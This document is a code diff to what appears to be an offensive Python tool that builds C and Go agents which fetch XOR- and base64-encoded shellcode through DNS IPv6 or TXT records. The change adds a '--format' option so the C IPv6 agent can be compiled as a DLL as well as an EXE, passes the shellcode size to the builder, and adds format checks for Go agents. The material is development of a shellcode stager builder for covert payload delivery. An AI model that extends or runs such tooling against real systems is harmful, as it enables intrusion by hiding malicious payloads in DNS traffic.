@@ -52,6 +52,11 @@ parser.add_argument(
     required=False,
     help='sleep for N seconds between each DNS request'
 )
+parser.add_argument(
+    '--format',
+    required=False,
+    help='payload format (.dll or .exe)',
+)
 
 
 args = parser.parse_args()
@@ -63,8 +68,21 @@ shellcode_path = args.shellcode_path
 output = args.output
 key = args.xorkey
 sleep = args.sleep
+format = args.format
 
 
+if format == ".exe":
+    format_to_use = ".exe"
+
+elif format == ".dll":
+    format_to_use = ".dll"
+
+elif format == None:
+    format_to_use = ".exe"
+
+else:
+    print_error("Payload format should be .exe or .dll")
+    exit()
 
 if payloads:
     show_payloads()
@@ -147,18 +165,31 @@ if payload in dnsstager_payloads:
 
 
     if language == "c" and mode == "ipv6":
+        shellcode_size = len(shellcode)
         encoded_shellcode = encode_xor_shellcode(shellcode, key)
         ZONES = generate_zone_ipv6(domain_to_use, encoded_shellcode, prefix)
-        build_c_xor_ipv6(domain_to_use, prefix, sleep, output, key, arch)
+        if format_to_use == ".exe":
+            build_c_xor_ipv6(domain_to_use, prefix, sleep, output, key, arch, shellcode_size)
+        elif format_to_use == ".dll":
+            build_c_xor_ipv6_dll(domain_to_use, prefix, sleep, output, key, arch, shellcode_size)
+        else:
+            build_c_xor_ipv6(domain_to_use, prefix, sleep, output, key, arch, shellcode_size)
 
 
     if language == "golang" and mode == "ipv6":
+        if format_to_use != ".exe":
+            print_error("GoLang agents should be saved as .exe format only!")
+            exit()
         # call golang ipv6
         encoded_shellcode = encode_xor_shellcode(shellcode, key)
         ZONES = generate_zone_ipv6(domain_to_use, encoded_shellcode, prefix)
         build_golang_xor_ipv6(domain_to_use, prefix, sleep, output, key, arch)
 
+
     if language == "golang" and mode == "txt":
+        if format_to_use != ".exe":
+            print_error("GoLang agents should be saved as .exe format only!")
+            exit()
         # call golang txt
         encoded_xor_shellcode = encode_xor_shellcode(shellcode, key).encode()
         encoded_shellcode = encode_shellcode_base64(encoded_xor_shellcode)
